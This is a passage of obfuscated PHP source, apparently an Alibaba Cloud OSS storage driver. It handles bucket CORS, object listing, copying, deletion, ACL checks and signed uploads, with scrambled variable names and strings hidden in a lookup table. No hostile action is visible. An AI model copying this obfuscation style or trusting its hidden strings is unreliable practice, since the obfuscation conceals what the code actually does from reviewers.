$´õ¹ğÉû->setMaxAgeSeconds(600); $´õ¹ğÉû->addExposeHeader($‹Ü‰şÂ[1624]); $´õ¹ğÉû->addAllowedHeader($‹Ü‰şÂ[1619]); $½ò‰ïî->addRule($´õ¹ğÉû); try { $this->client->putBucketCors($this->bucket, $½ò‰ïî); } catch (OSS\Core\OssException $ÖÜ±üöº) { $this->writeLog(__FUNCTION__ . $‹Ü‰şÂ[213] . $ÖÜ±üöº->getMessage()); return !1; } return !0; } public function getBucketCors() { $­ƒ®ß‰ú =& $_SERVER[€ä¾™²]; $„Å§´’Ø = null; try { $„Å§´’Ø = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÌË¿Ÿ¾) { $this->writeLog(__FUNCTION__ . $­ƒ®ß‰ú[213] . $ÌË¿Ÿ¾->getMessage()); return null; } if (!$„Å§´’Ø || !($¸Éº¬—ë = $„Å§´’Ø->getRules())) { return null; } $Ï³‹Û€’ = $¸Éº¬—ë[0]->getAllowedOrigins(); $¥®âÒ® = $¸Éº¬—ë[0]->getAllowedMethods(); $ıÈš‹å = $¸Éº¬—ë[0]->getMaxAgeSeconds(); $‹şª­Õ = $¸Éº¬—ë[0]->getExposeHeaders(); $¶Óğ††‰ = $¸Éº¬—ë[0]->getAllowedHeaders(); return array($­ƒ®ß‰ú[219] => isset($Ï³‹Û€’[0]) ? $Ï³‹Û€’[0] : $­ƒ®ß‰ú[12], $­ƒ®ß‰ú[223] => $¥®âÒ®, $­ƒ®ß‰ú[1625] => $ıÈš‹å, $­ƒ®ß‰ú[1626] => isset($‹şª­Õ[0]) ? $‹şª­Õ[0] : $­ƒ®ß‰ú[12], $­ƒ®ß‰ú[220] => isset($¶Óğ††‰[0]) ? $¶Óğ††‰[0] : $­ƒ®ß‰ú[12]); } public function isBucketCors() { $şˆæÂêş =& $_SERVER[€ä¾™²]; $“¯èŞá¼ = $this->getBucketCors(); if (!$“¯èŞá¼ || !is_array($“¯èŞá¼)) { return !1; } if ($“¯èŞá¼[$şˆæÂêş[219]] != $şˆæÂêş[221] || $“¯èŞá¼[$şˆæÂêş[220]] != $şˆæÂêş[221]) { return !1; } $…¼šİÌª = array_map($şˆæÂêş[222], $“¯èŞá¼[$şˆæÂêş[223]]); if (!is_array($…¼šİÌª)) { $…¼šİÌª = array(); } $ËòáéÁ = array($şˆæÂêş[224], $şˆæÂêş[225], $şˆæÂêş[226], $şˆæÂêş[227], $şˆæÂêş[228]); $Ø·ôˆ—¸ = array_diff($ËòáéÁ, $…¼šİÌª); return empty($Ø·ôˆ—¸); } public function mkfile($¨šƒ²Ê½, $Á»ŸˆÉº = '', $º¿®áò = REPEAT_RENAME) { $‰…Ñ˜ô¹ = $this->setContent($¨šƒ²Ê½, $Á»ŸˆÉº); if ($‰…Ñ˜ô¹ !== !1) { return $this->getPathOuter($¨šƒ²Ê½); } return !1; } public function mkdir($“Å³úÚ, $’‚¡­¼› = REPEAT_SKIP) { if ($’‚¡­¼› && $this->_isFolder($“Å³úÚ)) { return $this->getPathOuter($“Å³úÚ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($“Å³úÚ)); } catch (OSS\Core\OssException $æ‰·Éßî) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $æ‰·Éßî->getMessage()); return !1; } return $this->getPathOuter($“Å³úÚ); } private function fileList($‚â•¡Öø, $şó›Ú”í = '', $È¢šŠ­Í = 0) { $‚×şšÏ =& $_SERVER[€ä¾™²]; $‚â•¡Öø = trim($‚â•¡Öø, $‚×şšÏ[8]); $åàÕñ¿ = empty($‚â•¡Öø) && $‚â•¡Öø !== $‚×şšÏ[229] ? $‚×şšÏ[12] : $‚â•¡Öø . $‚×şšÏ[8]; $ªë¬ŒíÛ = $‚×şšÏ[12]; $¸—¼Ã¨È = 1000; $ÑëË½Øô = $ÎòÀßí– = array(); while (!0) { check_abort(); $‰Â±¹áà = array($‚×şšÏ[1627] => $şó›Ú”í, $‚×şšÏ[1628] => $åàÕñ¿, $‚×şšÏ[1629] => $¸—¼Ã¨È, $‚×şšÏ[1630] => $ªë¬ŒíÛ); try { $†š–é = $this->client->listObjects($this->bucket, $‰Â±¹áà); } catch (OSS\Core\OssException $÷½ß¡İì) { $this->writeLog(__FUNCTION__ . $‚×şšÏ[213] . $÷½ß¡İì->getMessage()); break; } $ªë¬ŒíÛ = $†š–é->getNextMarker(); $Ñèè¾”• = $†š–é->getObjectList(); $¤È’âä  = $†š–é->getPrefixList(); foreach ($Ñèè¾”• as $€¸ô®Ò‘) { if ($€¸ô®Ò‘->getKey() == $åàÕñ¿) { continue; } $şå“Íü = $€¸ô®Ò‘->getKey(); $¹¥æšÄº = $€¸ô®Ò‘->getSize(); $¨Éƒ£Îæ = $€¸ô®Ò‘->getLastModified(); $Œ²Íˆ· = trim($€¸ô®Ò‘->getETag(), $‚×şšÏ[119]); $ß³ˆÔâÆ = $È¢šŠ­Í ? array($‚×şšÏ[32] => $şå“Íü, $‚×şšÏ[79] => $¹¥æšÄº, $‚×şšÏ[205] => strtotime($¨Éƒ£Îæ), $‚×şšÏ[1631] => $Œ²Íˆ·) : $şå“Íü; $ ªïáøú = $¹¥æšÄº == 0 && substr($şå“Íü, strlen($şå“Íü) - 1, 1) == $‚×şšÏ[8] ? !0 : !1; $èÖññ¤œ = array($‚×şšÏ[79] => $¹¥æšÄº, $‚×şšÏ[1632] => $¹¥æšÄº, $‚×şšÏ[88] => strtotime($¨Éƒ£Îæ), $‚×şšÏ[1633] => $¨Éƒ£Îæ, $‚×şšÏ[1631] => $Œ²Íˆ·); $this->cacheMethodInfoSet($şå“Íü, $ ªïáøú, $èÖññ¤œ); if ($ ªïáøú) { $ÑëË½Øô[] = $şå“Íü; continue; } $ÎòÀßí–[] = $ß³ˆÔâÆ; } foreach ($¤È’âä  as $äüõÌË) { $ÑëË½Øô[] = $äüõÌË->getPrefix(); $this->cacheMethodInfoSet($äüõÌË->getPrefix(), !0); } if ($ªë¬ŒíÛ === $‚×şšÏ[12]) { break; } } $this->cacheMethodInfoSet($‚â•¡Öø, !0); return array($‚×şšÏ[85] => $ÑëË½Øô, $‚×şšÏ[86] => $ÎòÀßí–); } public function listObject($Âà­¸½, $›Å”˜“Ë = '') { $ËÄöƒÅ• =& $_SERVER[€ä¾™²]; $Âà­¸½ = trim($Âà­¸½, $ËÄöƒÅ•[8]); $¥¢„ÂÔÃ = empty($Âà­¸½) && $Âà­¸½ !== $ËÄöƒÅ•[229] ? $ËÄöƒÅ•[12] : $Âà­¸½ . $ËÄöƒÅ•[8]; $¾½‚‹ô = $ËÄöƒÅ•[12]; $³Õª§ì¦ = 1000; $êŞùşÜñ = $Æë¾¥‹Í = array(); while (!0) { check_abort(); $§ïœÛ£Ô = array($ËÄöƒÅ•[1627] => $›Å”˜“Ë, $ËÄöƒÅ•[1628] => $¥¢„ÂÔÃ, $ËÄöƒÅ•[1629] => $³Õª§ì¦, $ËÄöƒÅ•[1630] => $¾½‚‹ô); try { $¸³ê¹ıœ = $this->client->listObjects($this->bucket, $§ïœÛ£Ô); } catch (OSS\Core\OssException $¡ßÇ¿›œ) { $this->writeLog(__FUNCTION__ . $ËÄöƒÅ•[213] . $¡ßÇ¿›œ->getMessage()); break; } $¾½‚‹ô = $¸³ê¹ıœ->getNextMarker(); $ÚßÊñö¤ = $¸³ê¹ıœ->getObjectList(); foreach ($ÚßÊñö¤ as $íì· õ¹) { if ($íì· õ¹->getKey() == $¥¢„ÂÔÃ) { continue; } $ŒÅ†—ØĞ = $íì· õ¹->getKey(); $ªÚÚ¬å¯ = $íì· õ¹->getSize(); $óâÖöÍ¤ = $ªÚÚ¬å¯ == 0 && substr($ŒÅ†—ØĞ, strlen($ŒÅ†—ØĞ) - 1, 1) == $ËÄöƒÅ•[8] ? !0 : !1; if ($óâÖöÍ¤) { continue; } $Æë¾¥‹Í[] = $ªÚÚ¬å¯ . $ËÄöƒÅ•[213] . $ŒÅ†—ØĞ; } if ($¾½‚‹ô === $ËÄöƒÅ•[12]) { break; } } return array($ËÄöƒÅ•[85] => $êŞùşÜñ, $ËÄöƒÅ•[86] => $Æë¾¥‹Í); } public function copyFile($ÇÉ„÷Šô, $Ú°“â‡è) { $Õ«øâÃÏ = $this->size($ÇÉ„÷Šô); if ($Õ«øâÃÏ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÇÉ„÷Šô, $this->bucket, $this->pathEncode($Ú°“â‡è)); } catch (OSS\Core\OssException $ çùş”Œ) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $ çùş”Œ->getMessage()); return !1; } return $this->getPathOuter($Ú°“â‡è); } $ÅÓÁ¸Â• = $this->multiCopyObject($ÇÉ„÷Šô, $Ú°“â‡è, $Õ«øâÃÏ); return $ÅÓÁ¸Â• ? $this->getPathOuter($Ú°“â‡è) : !1; } private function multiCopyObject($ËÏæ®È–, $²›ÔÍØÁ, $Îºíª¹•) { $ä´êƒÂ =& $_SERVER[€ä¾™²]; try { $•ª¤Œš£ = array(); if ($‘…üÙ– = $this->hashMd5($ËÏæ®È–)) { $•ª¤Œš£ = array(OSS\OssClient::OSS_HEADERS => array($ä´êƒÂ[1634] => $‘…üÙ–)); } $¤İ¨æ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($²›ÔÍØÁ), $•ª¤Œš£); $çö÷‚•Ò = 1; $ß½‹»îµ = 0; $ëËôÕ¾ó = array(); $­áº“Šº = 1024 * 1024 * 10; $‘¬Æ©éı = $this->client->generateMultiuploadParts($Îºíª¹•, $­áº“Šº); foreach ($‘¬Æ©éı as $Â®‘Û’² => $³©ÁØô) { $Üƒ±¥É = $ß½‹»îµ + (int) $³©ÁØô[$ä´êƒÂ[1635]]; $²İ ç»ú = (int) $³©ÁØô[$ä´êƒÂ[413]] + $Üƒ±¥É - 1; $®Ë™ŒÊ = array($ä´êƒÂ[165] => $Üƒ±¥É, $ä´êƒÂ[166] => $²İ ç»ú); $ëËôÕ¾ó[] = $this->client->uploadPartCopy($this->bucket, $ËÏæ®È–, $this->bucket, $this->pathEncode($²›ÔÍØÁ), $çö÷‚•Ò, $¤İ¨æ, $®Ë™ŒÊ); $çö÷‚•Ò = $çö÷‚•Ò + 1; } $ˆê÷ÁÌë = array(); foreach ($ëËôÕ¾ó as $Â®‘Û’² => $õÓÍÍÖ¤) { $ˆê÷ÁÌë[] = array($ä´êƒÂ[298] => $Â®‘Û’² + 1, $ä´êƒÂ[299] => $õÓÍÍÖ¤); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($²›ÔÍØÁ), $¤İ¨æ, $ˆê÷ÁÌë); } catch (OSS\Core\OssException $ı•¦¦×‚) { $this->writeLog(__FUNCTION__ . $ä´êƒÂ[213] . $ı•¦¦×‚->getMessage()); return !1; } return !0; } public function moveFile($ËÔîŞÔº, $ÔàÜ€œö) { if ($this->copyFile($ËÔîŞÔº, $ÔàÜ€œö)) { $this->remove($ËÔîŞÔº); return $this->getPathOuter($ÔàÜ€œö); } return !1; } public function delFile($»óäÄŸò) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($»óäÄŸò)); } catch (OSS\Core\OssException $™ûé½Şñ) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $™ûé½Şñ->getMessage()); return !1; } return !0; } public function delFolder($Êúù©ş) { $Ò†µô =& $_SERVER[€ä¾™²]; if (!$this->exist($Êúù©ş)) { return !0; } $this->listItemCache = !1; $Æà·§Î¾ = $this->fileList($Êúù©ş); $this->listItemCache = !0; $á™ó«¾‚ = trim($Êúù©ş, $Ò†µô[8]) . $Ò†µô[8]; if (!empty($Êúù©ş) && $Êúù©ş !== $Ò†µô[229] && !in_array($á™ó«¾‚, $Æà·§Î¾[$Ò†µô[85]])) { $Æà·§Î¾[$Ò†µô[85]][] = $á™ó«¾‚; } $Êä‰³¬ó = $this->delByBatch($Æà·§Î¾[$Ò†µô[86]]); if (!$Êä‰³¬ó) { return !1; } $Êä‰³¬ó = $this->delByBatch($Æà·§Î¾[$Ò†µô[85]]); if (!$Êä‰³¬ó) { return !1; } return $this->delFile($á™ó«¾‚); } private function delByBatch($÷–÷Š ©) { foreach (array_chunk($÷–÷Š ©, 1000) as $Ã­â ÚÄ) { try { $this->client->deleteObjects($this->bucket, $Ã­â ÚÄ); } catch (OSS\Core\OssException $ÂÈ¹Å›€) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $ÂÈ¹Å›€->getMessage()); return !1; } } return !0; } public function rename($Ÿ¡ª–», $Ùå…ÕŠ„) { return $this->renameObject($Ÿ¡ª–», $Ùå…ÕŠ„); } private function fileInfo($èé€¬¯, $Ñôå‡¤Š = false, $§õÍ’Œ» = array()) { $£·Óë†ä =& $_SERVER[€ä¾™²]; $Óå¡Ÿêã = array($£·Óë†ä[32] => $this->pathThis($èé€¬¯), $£·Óë†ä[87] => $this->getPathOuter($èé€¬¯), $£·Óë†ä[33] => $£·Óë†ä[231], $£·Óë†ä[79] => isset($§õÍ’Œ»[$£·Óë†ä[79]]) ? $§õÍ’Œ»[$£·Óë†ä[79]] : 0, $£·Óë†ä[167] => $this->ext($èé€¬¯)); if ($Ñôå‡¤Š) { return $Óå¡Ÿêã; } $Óå¡Ÿêã[$£·Óë†ä[232]] = $Óå¡Ÿêã[$£·Óë†ä[88]] = 0; $Óå¡Ÿêã[$£·Óë†ä[233]] = $Óå¡Ÿêã[$£·Óë†ä[234]] = !0; if (empty($§õÍ’Œ»)) { $‰Ã×ßä° = $this->objectMeta($èé€¬¯); if (!$‰Ã×ßä°) { return $Óå¡Ÿêã; } $§õÍ’Œ» = array($£·Óë†ä[88] => strtotime($‰Ã×ßä°[$£·Óë†ä[1633]]), $£·Óë†ä[79] => $‰Ã×ßä°[$£·Óë†ä[1632]] + 0, $£·Óë†ä[1631] => $‰Ã×ßä°[$£·Óë†ä[1631]]); } if (isset($§õÍ’Œ»[$£·Óë†ä[1631]]) && $§õÍ’Œ»[$£·Óë†ä[1631]]) { $Óå¡Ÿêã[$£·Óë†ä[236]] = trim($§õÍ’Œ»[$£·Óë†ä[1631]], $£·Óë†ä[119]); } if (isset($§õÍ’Œ»[$£·Óë†ä[79]])) { $Óå¡Ÿêã[$£·Óë†ä[79]] = $§õÍ’Œ»[$£·Óë†ä[79]]; } if (isset($§õÍ’Œ»[$£·Óë†ä[88]])) { $Óå¡Ÿêã[$£·Óë†ä[88]] = $§õÍ’Œ»[$£·Óë†ä[88]]; } if (isset($§õÍ’Œ»[$£·Óë†ä[205]]) && !trim($Óå¡Ÿêã[$£·Óë†ä[88]])) { $Óå¡Ÿêã[$£·Óë†ä[88]] = $§õÍ’Œ»[$£·Óë†ä[205]]; } return $Óå¡Ÿêã; } private function folderInfo($µ÷‘Ó‘, $Õ°ò›ÅÎ = false, $£šÎ™ÛÙ = array()) { $Œ©ÌÖÖÄ =& $_SERVER[€ä¾™²]; $í¥á¸æ = array($Œ©ÌÖÖÄ[32] => $this->pathThis($µ÷‘Ó‘), $Œ©ÌÖÖÄ[87] => $this->getPathOuter($Œ©ÌÖÖÄ[8] . $µ÷‘Ó‘), $Œ©ÌÖÖÄ[33] => $Œ©ÌÖÖÄ[78]); if ($Õ°ò›ÅÎ) { return $í¥á¸æ; } $í¥á¸æ[$Œ©ÌÖÖÄ[232]] = $í¥á¸æ[$Œ©ÌÖÖÄ[88]] = 0; $í¥á¸æ[$Œ©ÌÖÖÄ[233]] = $í¥á¸æ[$Œ©ÌÖÖÄ[234]] = !0; if (empty($£šÎ™ÛÙ)) { $µ÷‘Ó‘ = rtrim($µ÷‘Ó‘, $Œ©ÌÖÖÄ[8]) . $Œ©ÌÖÖÄ[8]; $ñü‰Ó¿â = $this->objectMeta($µ÷‘Ó‘); if (!$ñü‰Ó¿â) { return $í¥á¸æ; } $£šÎ™ÛÙ = array($Œ©ÌÖÖÄ[232] => $ñü‰Ó¿â[$Œ©ÌÖÖÄ[602]][$Œ©ÌÖÖÄ[1636]], $Œ©ÌÖÖÄ[88] => strtotime($ñü‰Ó¿â[$Œ©ÌÖÖÄ[1633]])); } if (isset($£šÎ™ÛÙ[$Œ©ÌÖÖÄ[88]])) { $í¥á¸æ[$Œ©ÌÖÖÄ[88]] = $£šÎ™ÛÙ[$Œ©ÌÖÖÄ[88]]; } if (isset($£šÎ™ÛÙ[$Œ©ÌÖÖÄ[232]])) { $í¥á¸æ[$Œ©ÌÖÖÄ[232]] = $£šÎ™ÛÙ[$Œ©ÌÖÖÄ[232]]; } return $í¥á¸æ; } public function listPath($Ğòâê§Ö, $Ÿ¸¥·Ï = false) { $ÏÛšµ¯´ =& $_SERVER[€ä¾™²]; $ò³ã¦ß² = $this->fileList($Ğòâê§Ö, $ÏÛšµ¯´[8], !0); foreach ($ò³ã¦ß²[$ÏÛšµ¯´[85]] as $×ÃÙ°Ã => $—òêŸğï) { $ò³ã¦ß²[$ÏÛšµ¯´[85]][$×ÃÙ°Ã] = $this->folderInfo($—òêŸğï, $Ÿ¸¥·Ï, $—òêŸğï); } foreach ($ò³ã¦ß²[$ÏÛšµ¯´[86]] as $×ÃÙ°Ã => $—òêŸğï) { $ò³ã¦ß²[$ÏÛšµ¯´[86]][$×ÃÙ°Ã] = $this->fileInfo($—òêŸğï[$ÏÛšµ¯´[32]], $Ÿ¸¥·Ï, $—òêŸğï); } return $ò³ã¦ß²; } protected function infoChildren($™ÈŸ× ¶, &$÷ª¤şêó) { $¨ñ‹£ô =& $_SERVER[€ä¾™²]; $Ü¼• à  = $this->fileList($™ÈŸ× ¶, $¨ñ‹£ô[12], !0); $÷ª¤şêó[$¨ñ‹£ô[81]] += count($Ü¼• à [$¨ñ‹£ô[85]]); $÷ª¤şêó[$¨ñ‹£ô[80]] += count($Ü¼• à [$¨ñ‹£ô[86]]); foreach ($Ü¼• à [$¨ñ‹£ô[86]] as $ä†•ª˜) { if (!$ä†•ª˜ || !$ä†•ª˜[$¨ñ‹£ô[79]]) { continue; } $÷ª¤şêó[$¨ñ‹£ô[79]] += $ä†•ª˜[$¨ñ‹£ô[79]]; } } public function has($Ÿ¢åùÏˆ, $¾™ÑÉŸæ = false, $õÌĞ¨Õš = true) { $ƒ§ßµ¶² =& $_SERVER[€ä¾™²]; $Ÿ¢åùÏˆ = trim($Ÿ¢åùÏˆ, $ƒ§ßµ¶²[8]); $ÃÜæÅ = empty($Ÿ¢åùÏˆ) && $Ÿ¢åùÏˆ !== $ƒ§ßµ¶²[229] ? $ƒ§ßµ¶²[12] : $Ÿ¢åùÏˆ . $ƒ§ßµ¶²[8]; $µ¨—¡†½ = $ƒ§ßµ¶²[12]; $¼Ù¡ç‡ = 500; $É“¡ÉÈö = $Çöµ¥¸û = 0; while (!0) { check_abort(); $¡¼ä·…å = array($ƒ§ßµ¶²[1627] => $ƒ§ßµ¶²[8], $ƒ§ßµ¶²[1628] => $ÃÜæÅ, $ƒ§ßµ¶²[1629] => $¼Ù¡ç‡, $ƒ§ßµ¶²[1630] => $µ¨—¡†½); try { $ÉÊÙµë× = $this->client->listObjects($this->bucket, $¡¼ä·…å); } catch (OSS\Core\OssException $ŒäğÉú) { $this->writeLog(__FUNCTION__ . $ƒ§ßµ¶²[213] . $ŒäğÉú->getMessage()); break; } $µ¨—¡†½ = $ÉÊÙµë×->getNextMarker(); $ÆüîšÍË = $ÉÊÙµë×->getObjectList(); $£Û¥¥”Ó = $ÉÊÙµë×->getPrefixList(); if ($¾™ÑÉŸæ) { if (count($ÆüîšÍË) > 1 || count($ÆüîšÍË) == 1 && $ÆüîšÍË[0]->getKey() != $ÃÜæÅ) { $É“¡ÉÈö += count($ÆüîšÍË) - 1; } if (!empty($£Û¥¥”Ó)) { $Çöµ¥¸û += count($£Û¥¥”Ó); } if ($µ¨—¡†½ === $ƒ§ßµ¶²[12]) { break; } continue; } if ($õÌĞ¨Õš) { if (!empty($ÆüîšÍË)) { if (count($ÆüîšÍË) > 1 || $ÆüîšÍË[0]->getKey() != $ÃÜæÅ) { return !0; } } } else { if (!empty($£Û¥¥”Ó)) { return !0; } } if ($µ¨—¡†½ === $ƒ§ßµ¶²[12]) { break; } } if ($¾™ÑÉŸæ) { return array($ƒ§ßµ¶²[240] => $É“¡ÉÈö, $ƒ§ßµ¶²[241] => $Çöµ¥¸û); } return !1; } public function listAll($Ú¦ÖÒæÙ) { $‡üüŠÌè =& $_SERVER[€ä¾™²]; $š›Áºö = $this->fileList($Ú¦ÖÒæÙ, $‡üüŠÌè[12], !0); $£ŒÎÍš = array_to_keyvalue($š›Áºö[$‡üüŠÌè[86]], $‡üüŠÌè[32]); foreach ($š›Áºö[$‡üüŠÌè[85]] as $ğ·¿ÎëÏ) { if (is_string($ğ·¿ÎëÏ)) { $£ŒÎÍš[$ğ·¿ÎëÏ] = array($‡üüŠÌè[79] => 0); } } return $this->listAllFiles($Ú¦ÖÒæÙ, $£ŒÎÍš); } public function canRead($áŠ–·¼•) { $¢Ğ•–‹Ì =& $_SERVER[€ä¾™²]; $‰İ‹®¤± = $this->pathAcl($áŠ–·¼•); return $‰İ‹®¤± == $¢Ğ•–‹Ì[1637] || $‰İ‹®¤± == $¢Ğ•–‹Ì[649] ? !0 : !1; } public function canWrite($§£ªÎù) { $¦øÇŞ¿ß = $this->pathAcl($§£ªÎù); return $¦øÇŞ¿ß == $_SERVER[€ä¾™²][649] ? !0 : !1; } public function pathAcl($ê»Ù­íä) { $ÀÓÌé¾ =& $_SERVER[€ä¾™²]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ö¦®÷ü = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ê»Ù­íä)); } catch (OSS\Core\OssException $¶ªÆ…Êœ) { $this->writeLog(__FUNCTION__ . $ÀÓÌé¾[213] . $¶ªÆ…Êœ->getMessage()); return !1; } $úø¦ÔÃ = $ö¦®÷ü == $ÀÓÌé¾[37] ? $this->bucketAcl : $ö¦®÷ü; if ($úø¦ÔÃ == $ÀÓÌé¾[1638]) { return $ÀÓÌé¾[1637]; } if ($úø¦ÔÃ == $ÀÓÌé¾[1639]) { return $ÀÓÌé¾[649]; } return $úø¦ÔÃ; } private function chmodPath($–¥şáÒ¦, $Ùæ»ÕĞ¯ = '') { $“Êšá“ =& $_SERVER[€ä¾™²]; $±ò°ÓéÎ = empty($Ùæ»ÕĞ¯) ? $“Êšá“[1639] : $Ùæ»ÕĞ¯; $‘Ó™Ñ…­ = array($“Êšá“[37], $“Êšá“[230], $“Êšá“[1638], $“Êšá“[1639]); if (!in_array($±ò°ÓéÎ, $‘Ó™Ñ…­)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($–¥şáÒ¦), $±ò°ÓéÎ); } catch (OSS\Core\OssException $åªÂÑ…Ò) { $this->writeLog(__FUNCTION__ . $“Êšá“[213] . $åªÂÑ…Ò->getMessage()); return !1; } return !0; } public function getContent($¸–ƒª„è) { return $this->fileSubstr($¸–ƒª„è, -1); } public function setContent($´óƒ¼½Ş, $ÖÌ•íŒ› = '') { $™çšªÅ› =& $_SERVER[€ä¾™²]; try { $áøéÇ¥¿ = $this->trafficLimit($™çšªÅ›[1640]); $æÂÅİÇí = $this->client->putObject($this->bucket, $this->pathEncode($´óƒ¼½Ş), $ÖÌ•íŒ›, $áøéÇ¥¿); } catch (OSS\Core\OssException $Á²µ¥‹º) { $this->writeLog(__FUNCTION__ . $™çšªÅ›[213] . $Á²µ¥‹º->getMessage()); return !1; } $Ê°ëî–Û = array($™çšªÅ›[1634] => trim($æÂÅİÇí[$™çšªÅ›[1631]], $™çšªÅ›[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($´óƒ¼½Ş))); $this->updateObjMeta($´óƒ¼½Ş, $Ê°ëî–Û); return isset($æÂÅİÇí[$™çšªÅ›[1641]][$™çšªÅ›[295]]) ? !0 : !1; } private function updateObjMeta($ÖÍÙš´‡, $ÍĞœ“’”) { $ÖÍÙš´‡ = $this->pathEncode($ÖÍÙš´‡); try { $ß¤áÛ²Ù = array(OSS\OssClient::OSS_HEADERS => $ÍĞœ“’”); $this->client->copyObject($this->bucket, $ÖÍÙš´‡, $this->bucket, $ÖÍÙš´‡, $ß¤áÛ²Ù); } catch (OSS\Core\OssException $ šıãÌİ) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][213] . $ šıãÌİ->getMessage()); return !1; } return !0; } public function upload($ğâ“›Œ, $ ß¡­¨, $…„÷ĞÎÁ = false, $ƒ­ìÜĞÇ = REPEAT_REPLACE) { $™Š€Úõ– =& $_SERVER[€ä¾™²]; if (!$ ß¡­¨ || !@file_exists($ ß¡­¨)) { return !1; } $¸“¶„ì¨ = trim($ğâ“›Œ, $™Š€Úõ–[8]); $®ĞÄº± = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($™Š€Úõ–[1634] => @md5_file($ ß¡­¨)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ğâ“›Œ))); $®ĞÄº± = $this->trafficLimit($™Š€Úõ–[1640], $®ĞÄº±); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¸“¶„ì¨), $ ß¡­¨, $®ĞÄº±); } catch (OSS\Core\OssException $ğ©¬´˜Ü) { $this->writeLog(__FUNCTION__ . $™Š€Úõ–[213] . $ğ©¬´˜Ü->getMessage()); return !1; } return $this->getPathOuter($ğâ“›Œ); } public function getHost() { $ÒÍ˜Ï— =& $_SERVER[€ä¾™²]; $øœ¼Úóñ = explode($ÒÍ˜Ï—[209], parent::getHost()); return $øœ¼Úóñ[0] . $ÒÍ˜Ï—[209] . $this->bucket . $ÒÍ˜Ï—[10] . $øœ¼Úóñ[1]; } public function uploadFormData($„„—ãµ™, $ˆÃ´½õ™ = 3600) { $²ËÆå =& $_SERVER[€ä¾™²]; if (!($Üò‘Ó©ú = $this->getHost())) { return !1; } $½„¤Æú— = $ˆÃ´½õ™; $¯Úİ¯İÙ = date($²ËÆå[1642], time() + $½„¤Æú—); $¶ÇŠü”ò = new DateTime($¯Úİ¯İÙ); $ÓüÙÍ Ğ = $¶ÇŠü”ò->format(DateTime::ISO8601); $õ¿°× = strpos($ÓüÙÍ Ğ, $²ËÆå[372]); $ÓüÙÍ Ğ = substr($ÓüÙÍ Ğ, 0, $õ¿°×) . $²ËÆå[1643]; $Ä€¡â•† = 1048576000 * 5; $ÊëíøÍ‚ = $this->pathFather($„„—ãµ™); $‚²Ñ®Ì = array($²ËÆå[263] => $ÓüÙÍ Ğ, $²ËÆå[266] => array(array($²ËÆå[1644], 0, $Ä€¡â•†), array($²ËÆå[268], $²ËÆå[269], $ÊëíøÍ‚))); $œä–Ü² = base64_encode(json_encode($‚²Ñ®Ì)); $ĞºõÍœê = base64_encode(hash_hmac($²ËÆå[1470], $œä–Ü², $this->secret, !0)); $ÙêÓÍñ¨ = array($²ËÆå[1645] => $this->accessKey, $²ËÆå[278] => $œä–Ü², $²ËÆå[271] => $²ËÆå[262], $²ËÆå[1646] => $ĞºõÍœê, $²ËÆå[207] => $Üò‘Ó©ú); $ÙêÓÍñ¨ = $this->trafficLimit($²ËÆå[1640], $ÙêÓÍñ¨, !0); return $ÙêÓÍñ¨; } public function uploadMultiData($ƒäã¢»å, $²¿¶Õ¿å = 3600) { $îŠõ™äè =& $_SERVER[€ä¾™²]; if (!($Åú×¿¾» = $this->getHost())) { return !1; } $’Ïçœ§ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ƒäã¢»å)); return array($îŠõ™äè[282] => $’Ïçœ§, $îŠõ™äè[207] => $Åú×¿¾» . $îŠõ™äè[8] . $this->pathEncode($ƒäã¢»å), $îŠõ™äè[283] => gmdate($îŠõ™äè[1647]), $îŠõ™äè[95] => $ƒäã¢»å); } public function uploadMultiAuth($à¾–ŒÀ, $¯¾¿‹À® = array()) { if (isset($¯¾¿‹À®[$_SERVER[€ä¾™²][284]])) { return $this->uploadPartAuth($à¾–ŒÀ, $¯¾¿‹À®); } return $this->uploadListAuth($à¾–ŒÀ, $¯¾¿‹À®); } private function uploadPartAuth($€Á“¥ Ø, $Ò»Æäâ = array()) { $Úİ¨°ôø =& $_SERVER[€ä¾™²]; $—““» = $Ò»Æäâ[$Úİ¨°ôø[95]]; $’ŠÔ¡à = $this->_getUploadAuth($—““», $Ò»Æäâ); $ËÂùØî = array($Úİ¨°ôø[287] => $’ŠÔ¡à[$Úİ¨°ôø[287]], $Úİ¨°ôø[283] => $’ŠÔ¡à[$Úİ¨°ôø[283]]); if (isset($’ŠÔ¡à[$Úİ¨°ôø[1648]])) { $ËÂùØî[$Úİ¨°ôø[1648]] = $’ŠÔ¡à[$Úİ¨°ôø[1648]]; } return $ËÂùØî; } private function uploadListAuth($Û†‘õŞÚ, $°õı¸ƒ = array()) { $Ÿ™¨¤Ë =& $_SERVER[€ä¾™²]; $ˆâÆò›· = $°õı¸ƒ[$Ÿ™¨¤Ë[95]]; $ÑÛ›åã¤ = $°õı¸ƒ[$Ÿ™¨¤Ë[282]]; $å‰äş”˜ = $this->client->listParts($this->bucket, $this->pathEncode($ˆâÆò›·), $ÑÛ›åã¤); $ÄÕŸ×¨ö = $å‰äş”˜->getListPart(); $¹·åï® = array(); foreach ($ÄÕŸ×¨ö as $ğĞ¹Ï¤Ô) { $¹·åï®[] = array($Ÿ™¨¤Ë[298] => $ğĞ¹Ï¤Ô->getPartNumber(), $Ÿ™¨¤Ë[299] => trim($ğĞ¹Ï¤Ô->getETag(), $Ÿ™¨¤Ë[119])); } if 